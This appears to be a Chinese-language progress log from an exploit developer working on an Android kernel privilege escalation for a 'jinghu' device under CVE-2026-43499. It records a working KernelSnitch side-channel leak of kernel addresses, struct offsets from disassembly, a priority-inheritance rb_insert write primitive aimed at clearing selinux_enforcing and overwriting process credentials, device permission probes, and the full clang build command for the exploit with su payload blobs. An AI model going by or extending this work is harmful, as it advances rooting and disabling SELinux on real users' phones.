# 关键发现汇总

## 1. kernelsnitch 完全工作 (推翻早期判断)

早期日志显示 "KernelSnitch mm_struct leak failed", 误以为 kernelsnitch 在 jinghu 上不工作。

分阶段测试证明 kernelsnitch 完全正常:
```
STAGE 3: kernelsnitch_setup → OK (cpu_count=10)
STAGE 4: clone_leak_child (find_collisions) → OK (child 正常退出)
STAGE 5: bruteforce → OK, 泄露 mm_struct=ffffff80186c5500
```

早期失败是 slab 布局偶发不稳定 (kernelsnitch 有时成功有时失败), 不是必然失败。

kernelsnitch 是纯 futex hash 侧信道, 不依赖任何设备接口 (不需要 /dev/diag)。在 XRing O1 上同样适用。

## 2. configfs_read_once bug (不是 Android 16 修补)

### 反汇编 configfs_bin_read_iter (0xffffffc080488c9c)

CFG_* 偏移验证 (全部正确):
```
CFG_NEEDS_READ_FILL_OFF = 0x50 → [x24+0x50] ✓
CFG_BIN_BUFFER_OFF      = 0x58 → [x24+0x58] ✓
CFG_BIN_BUFFER_SIZE_OFF = 0x60 → [x24+0x60] ✓
CFG_CB_MAX_SIZE_OFF     = 0x64 → [x24+0x64] ✓
```

### configfs_bin_read_iter 逻辑
```
[x24+0x50] (needs_read_fill) != 0 → 调用 read 函数填充 buffer
[x24+0x50] == 0 → 跳到 0xe34, 直接从 buffer 读:
  buffer_size [x24+0x60] <= *ppos → 返回 0
```

### configfs_read_once 设置 (util.c:786)
```c
put32(blob, CFG_NEEDS_READ_FILL_OFF - 11, 0);  // needs_read_fill=0
// 未设 CFG_BIN_BUFFER_OFF / CFG_BIN_BUFFER_SIZE_OFF → 都是 0
// 结果: buffer_size=0 → 返回 0 (pre_rb=0)
```

### 结论
- 这不是 Android 16 修补, 是代码实现 bug
- bug 在 Pixel 上也存在 (同偏移), configfs_read_once 可能从未成功过
- 早期文档 "Android 16 已修补 configfs" 是误判

## 3. PI 链触发成功但写入没成功

### 真机测试日志
```
STAGE 7: PI 链写 selinux_enforcing=0
enforce BEFORE=1 (1=Enforcing)
calling run_main_route_threads...
pselect returned attempt=1 ret=0 errno=0 calls=40 success=40 delay=50000
enforce AFTER=?? (ashmem open 失败导致 exit, 修复后仍 Enforcing)
```

consumer 40 次 sched_setattr 全部成功 (PI 链触发), 但 selinux 仍 Enforcing (写入没生效)。

### 可能原因

rb_insert 写入的值可能是**栈上 waiter 的 pi_tree_entry 地址** (栈地址, 非0), 不是 write_pc。

PI 链 rb_insert 流程:
```
1. fake_task.pi_waiters = fake_w0.pi_tree (根节点)
2. rb_insert 把栈上 waiter 插入 fake_task.pi_waiters
3. 遍历 fake_w0.pi_tree.rb_left = write_left (target-8)
4. 在 target 的子节点位置插入
5. *(target + 0x08) = &栈上waiter.pi_tree  ← 写入值是栈地址?
```

如果写入值是栈地址 (非0), 则:
- *(selinux_enforcing) = 栈地址 (非0) → 仍 Enforcing
- *(task->cred) = 栈地址 (非 init_cred) → 不提权

### 需要确认
反汇编 rt_mutex_adjust_prio_chain (0xffffffc081052868) 的 rb_insert 部分, 确认:
1. 写入位置是 write_left+0x08 还是别的
2. 写入值是 write_pc 还是栈上 waiter 的 pi_tree 地址

## 4. ashmem SELinux 拦截

```
/dev/ashmem 权限: crw-rw-rw- root root (666)
但 cat /dev/ashmem: Permission denied
```

DAC (文件权限) 允许, 但 MAC (SELinux) 拒绝 shell 域 open。

影响: configfs 路线完全不可用 (需 ashmem fd)。cred 直写不需要 ashmem, 但读 mm->owner 需要。

## 5. /dev/uhid 可用

```
crw-rw-rw- uhid uhid 10,239 /dev/uhid
```

所有人可读写。uhid 可创建 HID 设备, 可能有内核指针泄露路径。待研究。

## 6. page_base=0 问题

test_minimal STAGE 6 设置 `page_base = prepare_good_kernel_page(...)`, 日志确认 page_base 非0。但 STAGE 7 do_pselect_fake_lock_route 检查时 page_base=0。

原因不明 (可能多线程可见性或编译器优化)。

解决: STAGE 7 重新调 prepare_good_kernel_page 设置 page_base。

## 7. 真机环境

```
设备: 0086207001A00540 (jinghu)
uid=2000(shell) SELinux=Enforcing
内核: 6.6.77-android15-8-g5770c661275f-abogki443185593-4k
shell 组: uhid(3011) readtracefs(3012)
日志: /sdcard/Download/log_*.txt (exploit_log_init 重定向 stdout)
```

## 8. 编译方式

```bash
cd CyberMeowfia/IonStack/CVE-2026-43499/exploit
clang --target=aarch64-linux-android35 --sysroot=$NDK/sysroot \
  -O2 -fPIC -I backup_v1/src \
  -DTARGET_CONFIG_H="targets/jinghu/target.h" \
  backup_v1/src/test_minimal.c backup_v1/src/main.c backup_v1/src/util.c \
  backup_v1/src/slide.c backup_v1/src/fops.c backup_v1/src/pipe.c \
  backup_v1/src/root.c backup_v1/src/su_blob.S backup_v1/src/wallpaper_blob.S \
  -shared -o test_minimal.so -pthread -fuse-ld=lld
```

注意: su_blob.S/wallpaper_blob.S 的 incbin 资源在 CyberMeowfia/exploit 目录下。
